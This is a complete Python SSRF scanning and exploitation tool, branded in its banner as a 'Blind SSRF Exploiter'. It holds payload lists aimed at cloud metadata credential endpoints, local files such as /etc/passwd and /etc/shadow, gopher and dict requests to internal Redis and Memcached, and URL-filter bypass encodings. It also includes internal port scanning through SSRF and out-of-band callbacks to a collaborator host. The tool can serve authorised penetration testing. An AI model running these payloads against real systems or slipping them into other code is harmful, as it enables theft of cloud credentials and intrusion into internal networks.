#!/usr/bin/env python3
"""
SSRF (Server-Side Request Forgery) Scanner
A comprehensive tool for detecting SSRF vulnerabilities
"""

import requests
import argparse
import json
import re
import time
import urllib.parse
from typing import List, Dict, Set, Tuple
from datetime import datetime
import concurrent.futures
import socket
import base64
import ipaddress

# ANSI color codes for terminal output
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# SSRF Payloads for different bypass techniques
SSRF_PAYLOADS = {
    'basic_internal': [
        'http://127.0.0.1',
        'http://localhost',
        'http://0.0.0.0',
        'http://[::1]',
        'http://0177.0.0.1',  # Octal
        'http://2130706433',  # Decimal
        'http://0x7f.0x0.0x0.0x1',  # Hex
    ],
    'cloud_metadata': [
        'http://169.254.169.254/latest/meta-data/',
        'http://169.254.169.254/latest/user-data/',
        'http://169.254.169.254/latest/dynamic/instance-identity/',
        'http://metadata.google.internal/computeMetadata/v1/',
        'http://169.254.169.254/metadata/v1/',
        'http://100.100.100.200/latest/meta-data/',  # Alibaba Cloud
    ],
    'protocol_bypass': [
        'file:///etc/passwd',
        'file:///c:/windows/win.ini',
        'dict://127.0.0.1:11211/stat',
        'gopher://127.0.0.1:6379/_INFO',
        'ldap://127.0.0.1:389',
        'sftp://127.0.0.1:22',
    ],
    'url_bypass': [
        'http://127.0.0.1@google.com',
        'http://google.com@127.0.0.1',
        'http://127.0.0.1%00.google.com',
        'http://127.0.0.1%2f.google.com',
        'http://127.0.0.1?.google.com',
        'http://127.0.0.1#.google.com',
        'http://127.1',
        'http://127.00.00.01',
    ],
    'encoding_bypass': [
        'http://127.0.0.1',
        'http://127.0.0.1%09',
        'http://127.0.0.1%0a',
        'http://127.0.0.1%0d',
        'http://127.0.0.1%00',
        'http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ',  # Unicode
        'http://127.1',
        'http://127.0.1',
    ],
    'redirect_bypass': [
        'http://spoofed.burpcollaborator.net',
        'http://redirect.example.com',
        'http://127.0.0.1.nip.io',
        'http://127.0.0.1.xip.io',
    ],
    'dns_rebinding': [
        'http://A.127.0.0.1.1time.10.20.30.40.1time.repeat.rebind.network',
        'http://make-127.0.0.1-rr.1u.ms',
    ],
    'localhost_variations': [
        'http://localhost.localdomain',
        'http://127.0.0.1.xip.io',
        'http://localtest.me',
        'http://customer1.app.localhost.my.company.127.0.0.1.nip.io',
        'http://mail.ebc.apple.com',  # Resolves to 127.0.0.6
        'http://127.127.127.127',
    ]
}

# Common internal ports to probe
INTERNAL_PORTS = [
    21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995,
    1433, 1521, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 8888, 9200, 27017
]

# Sensitive files to test
SENSITIVE_FILES = [
    '/etc/passwd',
    '/etc/shadow',
    '/etc/hosts',
    '/proc/self/environ',
    '/proc/self/cmdline',
    'C:/windows/win.ini',
    'C:/windows/system32/drivers/etc/hosts',
]

class SSRFScanner:
    def __init__(self, url: str, parameter: str = None, method: str = 'GET',
                 data: dict = None, headers: dict = None, cookies: dict = None,
                 timeout: int = 10, threads: int = 10, verbose: bool = False,
                 output: str = None, collaborator: str = None):
        self.base_url = url
        self.parameter = parameter
        self.method = method.upper()
        self.data = data or {}
        self.headers = headers or {}
        self.cookies = cookies or {}
        self.timeout = timeout
        self.threads = threads
        self.verbose = verbose
        self.output = output
        self.collaborator = collaborator
        self.vulnerabilities = []
        self.session = requests.Session()
    
    @staticmethod
    def print_ascii_banner():
        """Print ASCII art banner - static method so it can be called without instance"""
        ascii_art = f"""{Colors.FAIL}
██████╗ ██╗     ██╗███╗   ██╗██████╗ ███████╗██╗   ██╗██████╗ ██╗   ██╗
██╔══██╗██║     ██║████╗  ██║██╔══██╗██╔════╝██║   ██║██╔══██╗╚██╗ ██╔╝
██████╔╝██║     ██║██╔██╗ ██║██║  ██║█████╗  ██║   ██║██████╔╝ ╚████╔╝ 
██╔══██╗██║     ██║██║╚██╗██║██║  ██║██╔══╝  ██║   ██║██╔══██╗  ╚██╔╝  
██████╔╝███████╗██║██║ ╚████║██████╔╝██║     ╚██████╔╝██║  ██║   ██║   
╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
{Colors.ENDC}
{Colors.OKCYAN}        B L I N D   S S R F   E X P L O I T E R
                by 0xS4r4n9{Colors.ENDC}
"""
        print(ascii_art)
        
    def print_banner(self):
        """Print tool banner with scan information"""
        self.print_ascii_banner()
        
        banner = f"""
{Colors.OKBLUE}
╔═══════════════════════════════════════════════════════════╗
║              SSRF Vulnerability Scanner v1.0              ║
║        Server-Side Request Forgery Detection Tool         ║
╚═══════════════════════════════════════════════════════════╝
{Colors.ENDC}
{Colors.OKCYAN}Target URL:{Colors.ENDC} {self.base_url}
{Colors.OKCYAN}Method:{Colors.ENDC} {self.method}
{Colors.OKCYAN}Timeout:{Colors.ENDC} {self.timeout}s
{Colors.OKCYAN}Threads:{Colors.ENDC} {self.threads}
{Colors.OKCYAN}Started:{Colors.ENDC} {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
        print(banner)
    
    def log(self, message: str, level: str = "INFO"):
        """Log messages with color coding"""
        colors = {
            "INFO": Colors.OKBLUE,
            "SUCCESS": Colors.OKGREEN,
            "WARNING": Colors.WARNING,
            "ERROR": Colors.FAIL,
            "VULN": Colors.FAIL + Colors.BOLD
        }
        color = colors.get(level, Colors.ENDC)
        timestamp = datetime.now().strftime('%H:%M:%S')
        print(f"{color}[{timestamp}] [{level}]{Colors.ENDC} {message}")
    
    def find_parameters(self) -> List[str]:
        """Find potential SSRF parameters in URL and data"""
        parameters = []
        
        # Parse URL parameters
        parsed_url = urllib.parse.urlparse(self.base_url)
        if parsed_url.query:
            params = urllib.parse.parse_qs(parsed_url.query)
            parameters.extend(params.keys())
        
        # Add data parameters
        if self.data:
            parameters.extend(self.data.keys())
        
        # Common SSRF parameter names
        common_params = [
            'url', 'uri', 'path', 'redirect', 'return', 'continue', 'dest',
            'destination', 'next', 'file', 'document', 'load', 'fetch',
            'request', 'callback', 'reference', 'site', 'html', 'feed',
            'host', 'port', 'to', 'out', 'view', 'dir', 'page', 'link'
        ]
        
        # Filter parameters that might be SSRF-prone
        ssrf_params = [p for p in parameters if any(k in p.lower() for k in common_params)]
        
        return ssrf_params if ssrf_params else parameters
    
    def test_payload(self, param: str, payload: str, payload_type: str) -> Dict:
        """Test a single SSRF payload"""
        result = {
            'parameter': param,
            'payload': payload,
            'type': payload_type,
            'vulnerable': False,
            'evidence': [],
            'response_time': 0,
            'status_code': None
        }
        
        try:
            # Prepare request
            if self.method == 'GET':
                # Inject payload into URL parameter
                parsed = urllib.parse.urlparse(self.base_url)
                params = urllib.parse.parse_qs(parsed.query)
                params[param] = [payload]
                new_query = urllib.parse.urlencode(params, doseq=True)
                test_url = urllib.parse.urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))
                
                start_time = time.time()
                response = self.session.get(
                    test_url,
                    headers=self.headers,
                    cookies=self.cookies,
                    timeout=self.timeout,
                    allow_redirects=False,
                    verify=False
                )
                response_time = time.time() - start_time
                
            else:  # POST
                test_data = self.data.copy()
                test_data[param] = payload
                
                start_time = time.time()
                response = self.session.post(
                    self.base_url,
                    data=test_data,
                    headers=self.headers,
                    cookies=self.cookies,
                    timeout=self.timeout,
                    allow_redirects=False,
                    verify=False
                )
                response_time = time.time() - start_time
            
            result['response_time'] = response_time
            result['status_code'] = response.status_code
            
            # Check for SSRF indicators
            indicators = self.check_ssrf_indicators(response, payload, payload_type)
            
            if indicators:
                result['vulnerable'] = True
                result['evidence'] = indicators
                self.log(f"POTENTIAL SSRF: {param} -> {payload}", "VULN")
                if self.verbose:
                    for evidence in indicators:
                        self.log(f"  └─ {evidence}", "WARNING")
            
        except requests.exceptions.Timeout:
            result['evidence'].append("Request timeout - possible SSRF causing delay")
            if 'localhost' in payload or '127.0.0.1' in payload:
                result['vulnerable'] = True
        except requests.exceptions.ConnectionError as e:
            if 'refused' in str(e).lower():
                result['evidence'].append("Connection refused - internal service may exist")
                result['vulnerable'] = True
        except Exception as e:
            if self.verbose:
                self.log(f"Error testing {payload}: {str(e)}", "ERROR")
        
        return result
    
    def check_ssrf_indicators(self, response, payload: str, payload_type: str) -> List[str]:
        """Check response for SSRF vulnerability indicators"""
        indicators = []
        
        # Check for metadata service responses
        if '169.254.169.254' in payload:
            if any(keyword in response.text.lower() for keyword in [
                'ami-id', 'instance-id', 'public-keys', 'security-credentials',
                'metadata', 'user-data', 'instance-identity'
            ]):
                indicators.append("AWS metadata service response detected")
            
            if 'computemetadata' in response.text.lower():
                indicators.append("GCP metadata service response detected")
        
        # Check for file:// protocol success
        if payload.startswith('file://'):
            if any(keyword in response.text for keyword in [
                'root:', 'daemon:', 'bin:', 'sys:', '[boot loader]', '[fonts]'
            ]):
                indicators.append("Local file access successful")
        
        # Check for internal service responses
        if '127.0.0.1' in payload or 'localhost' in payload:
            # Redis
            if b'REDIS' in response.content or b'+PONG' in response.content:
                indicators.append("Internal Redis service accessed")
            
            # Memcached
            if b'STAT' in response.content or b'VERSION' in response.content:
                indicators.append("Internal Memcached service accessed")
            
            # Elasticsearch
            if b'"cluster_name"' in response.content or b'"version"' in response.content:
                indicators.append("Internal Elasticsearch service accessed")
            
            # MongoDB
            if b'ismaster' in response.content or b'buildinfo' in response.content:
                indicators.append("Internal MongoDB service accessed")
        
        # Check response time anomalies
        if hasattr(self, 'baseline_time'):
            if response.elapsed.total_seconds() > self.baseline_time * 2:
                indicators.append(f"Significant response time increase ({response.elapsed.total_seconds():.2f}s)")
        
        # Check for error messages indicating internal access
        error_patterns = [
            'connection refused', 'connection timeout', 'no route to host',
            'network unreachable', 'cannot assign requested address',
            'internal server error', 'bad gateway', 'service unavailable'
        ]
        
        response_lower = response.text.lower()
        for pattern in error_patterns:
            if pattern in response_lower:
                indicators.append(f"Error pattern found: {pattern}")
        
        # Check for successful internal port responses
        if any(str(port) in payload for port in INTERNAL_PORTS):
            if response.status_code == 200 or len(response.content) > 100:
                indicators.append("Successful response from internal port")
        
        # Check for DNS rebinding success
        if 'rebind' in payload or 'rr' in payload:
            if response.status_code != 404:
                indicators.append("DNS rebinding may be possible")
        
        # Check for redirect bypass
        if response.status_code in [301, 302, 303, 307, 308]:
            location = response.headers.get('Location', '')
            if any(internal in location for internal in ['127.0.0.1', 'localhost', '169.254']):
                indicators.append("Redirect to internal address detected")
        
        return indicators
    
    def test_blind_ssrf(self, param: str) -> Dict:
        """Test for blind SSRF using timing attacks"""
        if not self.collaborator:
            return None
        
        self.log(f"Testing blind SSRF with collaborator: {self.collaborator}", "INFO")
        
        # Test with collaborator domain
        payload = f"http://{self.collaborator}"
        result = self.test_payload(param, payload, "blind_ssrf")
        
        return result
    
    def port_scan_via_ssrf(self, param: str) -> List[Dict]:
        """Attempt to scan internal ports via SSRF"""
        self.log("Attempting internal port scan via SSRF...", "INFO")
        results = []
        
        for port in INTERNAL_PORTS[:10]:  # Test first 10 ports
            payload = f"http://127.0.0.1:{port}"
            result = self.test_payload(param, payload, f"port_scan:{port}")
            if result['vulnerable']:
                results.append(result)
        
        return results
    
    def test_cloud_metadata(self, param: str) -> List[Dict]:
        """Test access to cloud metadata services"""
        self.log("Testing cloud metadata access...", "INFO")
        results = []
        
        for payload in SSRF_PAYLOADS['cloud_metadata']:
            result = self.test_payload(param, payload, "cloud_metadata")
            if result['vulnerable']:
                results.append(result)
                self.log(f"Cloud metadata accessible: {payload}", "VULN")
        
        return results
    
    def scan(self):
        """Main scanning function"""
        self.print_banner()
        
        # Find parameters to test
        if self.parameter:
            parameters = [self.parameter]
        else:
            parameters = self.find_parameters()
            self.log(f"Found {len(parameters)} parameters to test", "INFO")
        
        if not parameters:
            self.log("No parameters found to test. Use -p to specify a parameter.", "WARNING")
            return
        
        # Establish baseline response time
        try:
            start = time.time()
            self.session.request(self.method, self.base_url, timeout=self.timeout, verify=False)
            self.baseline_time = time.time() - start
            if self.verbose:
                self.log(f"Baseline response time: {self.baseline_time:.2f}s", "INFO")
        except:
            self.baseline_time = 1.0
        
        # Test each parameter
        for param in parameters:
            self.log(f"Testing parameter: {param}", "INFO")
            
            # Test all payload types
            for payload_type, payloads in SSRF_PAYLOADS.items():
                if self.verbose:
                    self.log(f"Testing {payload_type} payloads...", "INFO")
                
                with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
                    futures = {
                        executor.submit(self.test_payload, param, payload, payload_type): payload
                        for payload in payloads
                    }
                    
                    for future in concurrent.futures.as_completed(futures):
                        result = future.result()
                        if result['vulnerable']:
                            self.vulnerabilities.append(result)
            
            # Test cloud metadata
            metadata_results = self.test_cloud_metadata(param)
            self.vulnerabilities.extend(metadata_results)
            
            # Test port scanning (if verbose)
            if self.verbose:
                port_results = self.port_scan_via_ssrf(param)
                self.vulnerabilities.extend(port_results)
            
            # Test blind SSRF with collaborator
            if self.collaborator:
                blind_result = self.test_blind_ssrf(param)
                if blind_result and blind_result['vulnerable']:
                    self.vulnerabilities.append(blind_result)
        
        # Print summary
        self.print_summary()
        
        # Save results
        if self.output:
            self.save_results()
    
    def print_summary(self):
        """Print scan summary"""
        print(f"\n{Colors.BOLD}{'='*60}{Colors.ENDC}")
        print(f"{Colors.HEADER}{Colors.BOLD}SCAN SUMMARY{Colors.ENDC}")
        print(f"{Colors.BOLD}{'='*60}{Colors.ENDC}\n")
        
        print(f"{Colors.OKCYAN}Total Tests Performed:{Colors.ENDC} Multiple payload types")
        print(f"{Colors.FAIL}{Colors.BOLD}Potential Vulnerabilities:{Colors.ENDC} {len(self.vulnerabilities)}\n")
        
        if self.vulnerabilities:
            print(f"{Colors.FAIL}{Colors.BOLD}POTENTIAL SSRF VULNERABILITIES:{Colors.ENDC}\n")
            
            # Group by parameter
            params = {}
            for vuln in self.vulnerabilities:
                param = vuln['parameter']
                if param not in params:
                    params[param] = []
                params[param].append(vuln)
            
            for param, vulns in params.items():
                print(f"{Colors.FAIL}[!]{Colors.ENDC} {Colors.BOLD}Parameter: {param}{Colors.ENDC}")
                print(f"    {Colors.WARNING}Vulnerable Payloads:{Colors.ENDC} {len(vulns)}")
                
                for vuln in vulns[:3]:  # Show first 3 for each parameter
                    print(f"    {Colors.OKBLUE}└─{Colors.ENDC} {vuln['payload']}")
                    print(f"       {Colors.OKCYAN}Type:{Colors.ENDC} {vuln['type']}")
                    if vuln['status_code']:
                        print(f"       {Colors.OKCYAN}Status:{Colors.ENDC} {vuln['status_code']}")
                    for evidence in vuln['evidence']:
                        print(f"       {Colors.WARNING}Evidence:{Colors.ENDC} {evidence}")
                
                if len(vulns) > 3:
                    print(f"    {Colors.OKBLUE}└─{Colors.ENDC} ... and {len(vulns) - 3} more payloads")
                print()
        else:
            print(f"{Colors.OKGREEN}No obvious SSRF vulnerabilities detected!{Colors.ENDC}\n")
            print(f"{Colors.WARNING}Note: Consider manual testing with:{Colors.ENDC}")
            print(f"  - Burp Collaborator or similar out-of-band detection")
            print(f"  - Time-based blind SSRF techniques")
            print(f"  - Additional encoding/bypass methods\n")
    
    def save_results(self):
        """Save results to JSON file"""
        try:
            results = {
                'scan_info': {
                    'url': self.base_url,
                    'method': self.method,
                    'timestamp': datetime.now().isoformat(),
                    'total_vulnerabilities': len(self.vulnerabilities)
                },
                'vulnerabilities': self.vulnerabilities
            }
            
            with open(self.output, 'w') as f:
                json.dump(results, f, indent=2)
            
            self.log(f"Results saved to {self.output}", "SUCCESS")
        except Exception as e:
            self.log(f"Failed to save results: {str(e)}", "ERROR")

def main():
    # Display banner first, before any argument parsing
    SSRFScanner.print_ascii_banner()
    print()  # Add spacing
    
    parser = argparse.ArgumentParser(
        description='SSRF Vulnerability Scanner - Detect Server-Side Request Forgery',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic scan
  python ssrf_scanner.py -u "http://example.com/api?url=https://google.com"
  
  # Scan specific parameter
  python ssrf_scanner.py -u "http://example.com/api" -p url
  
  # POST request with data
  python ssrf_scanner.py -u "http://example.com/api" -m POST -d "url=test&param=value" -p url
  
  # With collaborator for blind SSRF
  python ssrf_scanner.py -u "http://example.com/api" -p url -c "burpcollaborator.net"
  
  # Verbose output with results
  python ssrf_scanner.py -u "http://example.com/api" -p url -v -o results.json
        """
    )
    
    parser.add_argument('-u', '--url', required=True, help='Target URL to scan')
    parser.add_argument('-p', '--parameter', help='Specific parameter to test')
    parser.add_argument('-m', '--method', default='GET', help='HTTP method (GET/POST, default: GET)')
    parser.add_argument('-d', '--data', help='POST data (key=value&key2=value2)')
    parser.add_argument('-H', '--headers', help='Custom headers (JSON format)')
    parser.add_argument('-C', '--cookies', help='Cookies (JSON format)')
    parser.add_argument('-c', '--collaborator', help='Collaborator domain for blind SSRF detection')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('-o', '--output', help='Output file for results (JSON format)')
    
    args = parser.parse_args()
    
    # Parse data if provided
    data = {}
    if args.data:
        data = dict(urllib.parse.parse_qsl(args.data))
    
    # Parse headers if provided
    headers = {}
    if args.headers:
        try:
            headers = json.loads(args.headers)
        except:
            print(f"{Colors.FAIL}Invalid headers JSON format{Colors.ENDC}")
            return
    
    # Parse cookies if provided
    cookies = {}
    if args.cookies:
        try:
            cookies = json.loads(args.cookies)
        except:
            print(f"{Colors.FAIL}Invalid cookies JSON format{Colors.ENDC}")
            return
    
    # Disable SSL warnings
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    # Create scanner instance and run
    scanner = SSRFScanner(
        url=args.url,
        parameter=args.parameter,
        method=args.method,
        data=data,
        headers=headers,
        cookies=cookies,
        timeout=args.timeout,
        threads=args.threads,
        verbose=args.verbose,
        output=args.output,
        collaborator=args.collaborator
    )
    
    try:
        scanner.scan()
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}Scan interrupted by user{Colors.ENDC}")
    except Exception as e:
        print(f"{Colors.FAIL}Error: {str(e)}{Colors.ENDC}")
        if args.verbose:
            import traceback
            traceback.print_exc()

if __name__ == "__main__":
    main()
